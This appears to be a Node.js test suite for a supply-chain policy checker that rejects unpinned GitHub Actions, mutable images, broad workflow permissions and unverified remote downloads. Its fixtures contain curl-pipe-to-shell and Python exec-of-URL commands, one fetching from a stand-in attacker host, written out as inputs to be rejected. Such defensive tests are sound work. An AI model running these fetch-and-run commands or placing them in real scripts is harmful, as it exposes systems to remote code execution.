import assert from 'node:assert/strict'
import { mkdtemp, mkdir, writeFile } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import path from 'node:path'
import test from 'node:test'

import { checkSupplyChainPolicy } from './supply-chain-policy.mjs'

async function fixture(files) {
  const root = await mkdtemp(path.join(tmpdir(), 'workshop-supply-policy-'))
  await Promise.all(Object.entries(files).map(async ([name, contents]) => {
    const target = path.join(root, name)
    await mkdir(path.dirname(target), { recursive: true })
    await writeFile(target, contents)
  }))
  return root
}

test('rejects mutable action references', async () => {
  const root = await fixture({
    '.github/workflows/ci.yml': 'steps:\n  - uses: actions/checkout@v4\n',
  })

  const result = await checkSupplyChainPolicy(root)

  assert.ok(result.errors.some((error) => error.includes('immutable 40-character commit SHA')))
})

test('requires a human-readable version comment beside an action SHA', async () => {
  const root = await fixture({
    '.github/workflows/ci.yml': `steps:\n  - uses: actions/checkout@${'a'.repeat(40)}\n`,
  })

  const result = await checkSupplyChainPolicy(root)

  assert.ok(result.errors.some((error) => error.includes('version comment')))
})

test('accepts pinned actions and local actions', async () => {
  const root = await fixture({
    '.github/workflows/ci.yml': `permissions:\n  contents: read\nsteps:\n  - uses: actions/checkout@${'a'.repeat(40)} # v4.2.2\n  - uses: ./actions/local\n`,
  })

  const result = await checkSupplyChainPolicy(root)

  assert.deepEqual(result.errors, [])
})

test('rejects mutable container action images', async () => {
  const root = await fixture({
    '.github/workflows/ci.yml': 'steps:\n  - uses: docker://alpine:3.23\n',
  })

  const result = await checkSupplyChainPolicy(root)

  assert.ok(result.errors.some((error) => error.includes('container action must use an immutable sha256 digest')))
})

test('rejects unverified remote execution in maintained shell surfaces', async () => {
  const root = await fixture({
    'infra/bootstrap.sh': 'curl -fsSL https://example.com/install.sh | sh\n',
  })

  const result = await checkSupplyChainPolicy(root)

  assert.ok(result.errors.some((error) => error.includes('unverified remote execution')))
})

test('rejects an external download that is saved but never verified', async () => {
  const root = await fixture({
    'setup/install.sh': 'curl -fsSL https://example.com/tool -o tool\nchmod +x tool\n',
  })

  const result = await checkSupplyChainPolicy(root)

  assert.ok(result.errors.some((error) => error.includes('unverified remote download')))
})

test('rejects multiline remote execution', async () => {
  const root = await fixture({
    'infra/bootstrap.sh': 'curl -fsSL \\\n  https://example.com/install.sh \\\n  | sh\n',
  })

  const result = await checkSupplyChainPolicy(root)

  assert.ok(result.errors.some((error) => error.includes('unverified remote execution')))
})

test('rejects variable-indirected curl commands', async () => {
  const root = await fixture({
    'setup/install.sh': 'source_url=https://example.com/install.sh\ncurl -fsSL "$source_url" | sh\n',
  })

  const result = await checkSupplyChainPolicy(root)

  assert.ok(result.errors.some((error) => error.includes('dynamic curl/wget source')))
})

test('rejects Python urllib remote inputs', async () => {
  const root = await fixture({
    'scripts/install.py': 'import urllib.request\nexec(urllib.request.urlopen("https://example.com/install.py").read())\n',
  })

  const result = await checkSupplyChainPolicy(root)

  assert.ok(result.errors.some((error) => error.includes('Python remote input')))
})

test('rejects remote execution embedded in workflow run scripts', async () => {
  const root = await fixture({
    '.github/workflows/ci.yml': 'permissions:\n  contents: read\njobs:\n  test:\n    steps:\n      - run: curl -fsSL https://example.com/install.sh | sh\n',
  })

  const result = await checkSupplyChainPolicy(root)

  assert.ok(result.errors.some((error) => error.includes('unverified remote execution')))
})

test('allows an exact-source, explicitly accepted remote execution risk', async () => {
  const root = await fixture({
    'infra/bootstrap.sh': '# supply-chain-exception: mise-bootstrap\ncurl -fsSL https://example.com/install.sh | sh\n',
    'supply-chain/exceptions.json': JSON.stringify({
      remoteInputs: [{
        id: 'mise-bootstrap',
        source: 'https://example.com/install.sh',
        kind: 'accepted-risk',
        reason: 'Interactive convenience path; installer bytes are not checksum pinned.',
        expires: '2999-01-01',
      }],
    }),
  })

  const result = await checkSupplyChainPolicy(root, { today: '2026-08-03' })

  assert.deepEqual(result.errors, [])
})

test('allows an exact-source download verified against its declared sha256', async () => {
  const checksum = 'a'.repeat(64)
  const root = await fixture({
    'setup/install.sh': `# supply-chain-exception: verified-tool\ncurl -fsSL https://example.com/tool -o tool && echo "${checksum}  tool" | sha256sum -c -\n`,
    'supply-chain/exceptions.json': JSON.stringify({
      remoteInputs: [{
        id: 'verified-tool',
        source: 'https://example.com/tool',
        kind: 'sha256',
        sha256: checksum,
        reason: 'Release artifact is verified before use.',
        expires: '2999-01-01',
      }],
    }),
  })

  const result = await checkSupplyChainPolicy(root, { today: '2026-08-03' })

  assert.deepEqual(result.errors, [])
})

test('rejects an exception whose safe source does not match the command', async () => {
  const root = await fixture({
    'infra/bootstrap.sh': '# supply-chain-exception: mise-bootstrap\ncurl -fsSL https://evil.example/install.sh | sh\n',
    'supply-chain/exceptions.json': JSON.stringify({
      remoteInputs: [{
        id: 'mise-bootstrap',
        source: 'https://example.com/install.sh',
        kind: 'accepted-risk',
        reason: 'Bound to one reviewed source.',
        expires: '2999-01-01',
      }],
    }),
  })

  const result = await checkSupplyChainPolicy(root, { today: '2026-08-03' })

  assert.ok(result.errors.some((error) => error.includes('does not match')))
})

test('rejects expired remote execution exceptions', async () => {
  const root = await fixture({
    'infra/bootstrap.sh': '# supply-chain-exception: mise-bootstrap\ncurl -fsSL https://example.com/install.sh | sh\n',
    'supply-chain/exceptions.json': JSON.stringify({
      remoteInputs: [{
        id: 'mise-bootstrap',
        source: 'https://example.com/install.sh',
        kind: 'accepted-risk',
        reason: 'Temporary exception.',
        expires: '2026-08-02',
      }],
    }),
  })

  const result = await checkSupplyChainPolicy(root, { today: '2026-08-03' })

  assert.ok(result.errors.some((error) => error.includes('expired')))
})

test('rejects impossible calendar dates in remote input exceptions', async () => {
  const root = await fixture({
    'supply-chain/exceptions.json': JSON.stringify({
      remoteInputs: [{
        id: 'bad-date',
        source: 'https://example.com/tool',
        kind: 'accepted-risk',
        reason: 'Mutation fixture.',
        expires: '2026-99-99',
      }],
    }),
  })

  const result = await checkSupplyChainPolicy(root, { today: '2026-08-03' })

  assert.ok(result.errors.some((error) => error.includes('invalid expiry date')))
})

test('rejects workflow-wide write permissions', async () => {
  const root = await fixture({
    '.github/workflows/ci.yml': 'permissions:\n  contents: write\njobs: {}\n',
  })

  const result = await checkSupplyChainPolicy(root)

  assert.ok(result.errors.some((error) => error.includes('workflow-wide write permission')))
})

test('requires every mise lock download to carry a sha256 checksum', async () => {
  const root = await fixture({
    'mise.lock': '[[tools.kind]]\nurl = "https://example.com/kind"\n',
  })

  const result = await checkSupplyChainPolicy(root)

  assert.ok(result.errors.some((error) => error.includes('mise.lock URL without adjacent sha256 checksum')))
})
